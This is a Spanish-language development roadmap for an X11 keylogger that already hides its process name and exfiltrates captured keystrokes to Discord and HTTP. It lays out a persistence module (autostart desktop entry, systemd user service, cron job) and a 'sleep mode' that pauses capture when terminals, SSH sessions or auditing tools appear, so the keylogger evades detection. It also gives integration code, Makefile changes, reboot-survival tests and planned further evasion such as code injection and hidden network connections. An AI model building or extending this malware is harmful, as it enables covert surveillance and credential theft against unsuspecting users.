# Hoja de Ruta Técnica - Implementación Completa

## 📍 Estado Actual del Proyecto

**Revisión:** En base a `x11_keylogger.c` v1.0 (con exfiltración Discord/HTTP)

### Capacidades Actuales ✅
- ✅ Captura global de eventos X11 (XRecord)
- ✅ Logging a archivo con timestamps
- ✅ Cambio de nombre de proceso (ocultamiento)
- ✅ Daemonización automática
- ✅ Exfiltración a Discord y HTTP
- ✅ Manejo de señales (limpieza)

### Capacidades Faltantes ❌
- ❌ Persistencia tras reinicio
- ❌ Auto-inicio de sesión
- ❌ Detección de anomalías
- ❌ Sleep mode adaptativo

---

## 🎯 Visión: Arquitectura Multi-Módulo

```
┌──────────────────────────────────────────────────────────┐
│                   x11_keylogger (CORE)                   │
│                                                          │
│  Captura X11 | Logging | Daemonización | Señales       │
└──────────┬───────────────────────────────┬───────────────┘
           │                               │
    ┌──────▼──────┐               ┌───────▼────────┐
    │ EXFIL (v1)  │               │ PERSIST (new)  │
    │             │               │                │
    │ Discord ✅  │               │ Desktop ✅     │
    │ HTTP ✅     │               │ Systemd ✅     │
    │             │               │ Cron ✅        │
    │ (src/)      │               │ Threat ✅      │
    │ (builtin)   │               │ Sleep ✅       │
    └─────────────┘               │                │
                                  │ (src/)         │
                                  │ (new files)    │
                                  └────────────────┘
```

---

## 🔨 FASE 1: Crear Módulo de Persistencia

### Paso 1.1: Crear `src/persistence.h` (Declaraciones)

**Tamaño estimado:** 150 líneas
**Tiempo:** 15 minutos

Contendrá:
- Enums para estados (NORMAL, SLEEP, SUSPENDED)
- Struct para estado persistente
- Declaraciones de funciones públicas
- Constantes y defines

**Archivo completamente listado en:** `docs/IMPLEMENTACION_PERSISTENCIA.md`

### Paso 1.2: Crear `src/persistence.c` (Implementación)

**Tamaño estimado:** 600 líneas
**Tiempo:** 45 minutos

Funciones por categoría:

#### Persistencia (200 líneas)
```
✓ install_autostart_entry()      - ~60 líneas
✓ install_systemd_service()      - ~65 líneas  
✓ install_cron_job()             - ~40 líneas
✓ get_home_dir()                 - ~25 líneas
✓ mkdir_recursive()               - ~25 líneas
```

#### Detección (250 líneas)
```
✓ detect_active_terminals()      - ~50 líneas
✓ detect_auditing_tools()        - ~120 líneas
✓ detect_ssh_activity()          - ~35 líneas
✓ is_user_suspicious()           - ~45 líneas
```

#### Gestión de Estado (150 líneas)
```
✓ get_current_state()            - ~5 líneas
✓ set_operation_state()          - ~10 líneas
✓ update_persistence_state()     - ~60 líneas
✓ state_to_string()              - ~10 líneas
✓ Variables globales + helpers   - ~65 líneas
```

---

## 🔌 FASE 2: Integración en x11_keylogger.c

### Paso 2.1: Incluir Header (1 línea)

**Ubicación:** Sección de #includes en main

```c
#include "persistence.h"  // ← Agregar después de otros includes
```

### Paso 2.2: Agregar Flag --install-persistence (30 líneas)

**Ubicación:** Función `main()`, antes de procesar opciones normales

```c
// Nuevo argumento en getopt
while ((opt = getopt_long(argc, argv, "...", long_options, &option_index)) != -1) {
    // ... opciones existentes ...
    
    // NUEVA OPCIÓN
    if (strcmp(argv[optind-1], "--install-persistence") == 0) {
        // Bloque de 30 líneas de instalación
    }
}
```

**Responsabilidades:**
- Obtener ruta del ejecutable (readlink /proc/self/exe)
- Instalar desktop entry
- Instalar systemd service
- Instalar cron job (opcional)
- Reportar éxito/fallo
- Exit(0) o Exit(1)

### Paso 2.3: Integrar Sleep Mode en Loop Principal (10 líneas)

**Ubicación:** Función `start_keylogger()`, en el while principal

```c
while (g_state.running) {
    // NUEVA LÍNEA: Actualizar estado cada iteración
    update_persistence_state();
    
    // NUEVA LÍNEA: Verificar estado
    if (get_current_state() == STATE_SLEEP) {
        usleep(100000);  // 100ms de pausa
        continue;        // Skip captura
    }
    
    // Código existente de captura...
    XRecordProcessReplies(g_state.record_display);
}
```

### Paso 2.4: Respetar Sleep Mode en Callback (5 líneas)

**Ubicación:** Función `record_callback()`

```c
void record_callback(XPointer closure, XRecordInterceptData *recorded_data) {
    // NUEVA LÍNEA: Verificar estado
    if (get_current_state() != STATE_NORMAL) {
        XRecordFreeData(recorded_data);
        return;  // No procesar evento
    }
    
    // Código existente...
}
```

---

## 🔨 FASE 3: Actualizar Makefile

### Paso 3.1: Compilar módulo de persistencia

```makefile
# Cambiar target 'all' para incluir persistence.o

all: persistence.o $(TARGET)

persistence.o: src/persistence.c src/persistence.h
	@echo "$(GREEN)Compilando persistence.c...$(NC)"
	$(CC) $(CFLAGS) -c src/persistence.c -o persistence.o

$(TARGET): persistence.o $(SOURCE)
	@echo "$(GREEN)Compilando $(TARGET)...$(NC)"
	$(CC) $(CFLAGS) -o $(TARGET) $(SOURCE) persistence.o $(LDFLAGS)
	@echo "$(GREEN)✓ Compilación exitosa!$(NC)"
```

### Paso 3.2: Actualizar clean target

```makefile
clean:
	@echo "$(YELLOW)Limpiando archivos compilados...$(NC)"
	rm -f $(TARGET)
	rm -f persistence.o        # NUEVA LÍNEA
	rm -f *.o
	@echo "$(GREEN)✓ Limpieza completa$(NC)"
```

---

## 🧪 FASE 4: Testing y Validación

### Test Suite

#### Test 1: Compilación
```bash
make clean
make

# Expectativa: Sin errores, genera persistence.o y x11_keylogger
```

#### Test 2: Instalación de Persistencia
```bash
./x11_keylogger --install-persistence

# Verificar archivos creados:
ls -la ~/.config/autostart/x11-monitor.desktop
ls -la ~/.config/systemd/user/x11-monitor.service
crontab -l | grep x11_keylogger

# Expectativa: Todos los archivos existen, crontab actualizado
```

#### Test 3: Systemd Service Status
```bash
systemctl --user status x11-monitor.service
systemctl --user enable x11-monitor.service
systemctl --user start x11-monitor.service

# Expectativa: enabled, active (running)
```

#### Test 4: Inicio Automático
```bash
systemctl --user start x11-monitor.service
sleep 2
pgrep -f x11_keylogger

# Expectativa: Retorna PID del proceso
```

#### Test 5: Sleep Mode - Detección de Terminal
```bash
# Terminal 1
./x11_keylogger -d  # Foreground para ver logs
sleep 2
echo "test1" > /tmp/test.txt  # Esto debería ser capturado

# Terminal 2
bash  # Abre nueva shell

# Terminal 1 debería mostrar: STATE_SLEEP (si logging implementado)
# Los keystrokes NO deberían ser capturados
```

#### Test 6: Sleep Mode - Recuperación
```bash
# Terminal 2
exit  # Cierra bash

# Esperar ~60 segundos (sleep_threshold * 5s)

# Terminal 1 debería mostrar: STATE_NORMAL (si logging implementado)
# Los keystrokes DEBERÍAN ser capturados nuevamente
```

#### Test 7: Reinicio del Sistema
```bash
# 1. Instalar persistencia
./x11_keylogger --install-persistence

# 2. Rebootear
sudo reboot

# 3. Después del reinicio, verificar:
pgrep -f x11_keylogger
# Expectativa: Retorna PID (proceso iniciado automáticamente)

ls -la keylog.txt
# Expectativa: Archivo existe con logs nuevos de la nueva sesión
```

#### Test 8: Performance
```bash
# Monitorear recursos mientras se ejecuta
top -p $(pgrep -f x11_keylogger)

# Expectativa:
# - CPU: < 1% promedio
# - MEM: < 10 MB
# - Chequeos cada 5s (no noticeable)
```

---

## 📋 Checklist de Implementación

### FASE 1: Creación de Módulo
- [ ] Crear `src/persistence.h` (155 líneas)
  - [ ] Enums y tipos
  - [ ] Declaraciones de funciones
  - [ ] Estructuras de estado
  
- [ ] Crear `src/persistence.c` (600 líneas)
  - [ ] Funciones de persistencia (instalación)
  - [ ] Funciones de detección (terminales, procesos)
  - [ ] Funciones de gestión de estado
  - [ ] Variables globales

### FASE 2: Integración
- [ ] Modificar `src/x11_keylogger.c`
  - [ ] Agregar #include "persistence.h"
  - [ ] Agregar --install-persistence en main()
  - [ ] Integrar update_persistence_state() en loop
  - [ ] Respetar STATE en record_callback()
  
- [ ] Modificar `Makefile`
  - [ ] Compilar persistence.c
  - [ ] Linkear persistence.o
  - [ ] Limpiar persistence.o en clean target

### FASE 3: Testing
- [ ] Test de compilación
- [ ] Test de instalación
- [ ] Test de autostart
- [ ] Test de sleep mode
- [ ] Test de recuperación
- [ ] Test de reinicio
- [ ] Test de performance

### FASE 4: Documentación
- [ ] Actualizar README.md con new features
- [ ] Crear `.github/examples/persistence-demo.md`
- [ ] Documentar opciones CLI en README
- [ ] Agregar sección "Seguridad" a README

---

## 🚀 Pasos Inmediatos (Quick Start)

### Para Implementador
1. **Hoy**: Copiar `src/persistence.h` y `.c` del documento IMPLEMENTACION_PERSISTENCIA.md
2. **Mañana**: Modificar `x11_keylogger.c` main() y loop principal
3. **Mañana**: Actualizar Makefile
4. **Pasado mañana**: Ejecutar test suite completo

### Comando de Build Actualizado
```bash
# Build final
make clean
make

# Install
sudo make install

# Usar
x11_keylogger --install-persistence
x11_keylogger --daemon --quiet
```

---

## 💡 Optimizaciones Futuras (Fase 2)

Después de implementar básico:

1. **Evasión de Detección**
   - Cambiar nombre de proceso más frecuentemente
   - Usar técnicas de code injection
   - Hidetar conexiones de red

2. **Detección Mejorada**
   - Monitorear inotify de archivos de log
   - Detectar strace/ltrace adjuntos
   - Detectar cambios en permisos de archivos

3. **Robustez**
   - Reintento de conexión exponencial
   - Sincronización de logs ante pérdida
   - Recuperación ante crash

4. **Logging Cifrado**
   - Encriptar logs locales
   - Incluir timestamp de evento (no de log)

---

## 🎓 Recursos de Aprendizaje

Mientras implementas:

- **X11 Security**: https://www.x.org/wiki/guide/security/
- **systemd User Services**: https://wiki.archlinux.org/title/Systemd/User
- **Linux /proc filesystem**: man 5 proc
- **Process Hiding Techniques**: MITRE ATT&CK TA0005 (Defense Evasion)
- **Threat Hunting**: MITRE ATT&CK Tactics/Techniques

---

## ⏱️ Estimación de Esfuerzo

```
FASE 1 (Crear módulos)      45 min
FASE 2 (Integración)         30 min
FASE 3 (Makefile)            10 min
FASE 4 (Testing)             45 min
FASE 5 (Documentación)       30 min
─────────────────────────────────
TOTAL ESTIMADO             2h 40m

CON DEBUGGING/FIXES         3h 30m
CON OPTIMIZACIONES          4h 30m
```

---

## 📞 Soporte Durante Implementación

Si encuentras problemas:

1. **Compilación**: Revisar includes, verificar CFLAGS en Makefile
2. **Linking**: Asegurar persistence.c esté incluido en target
3. **Persistencia**: Verificar permisos ~/.config/systemd/user/
4. **Sleep Mode**: Agregar debug prints en update_persistence_state()
5. **Performance**: Usar `strace` para identificar syscalls costosas

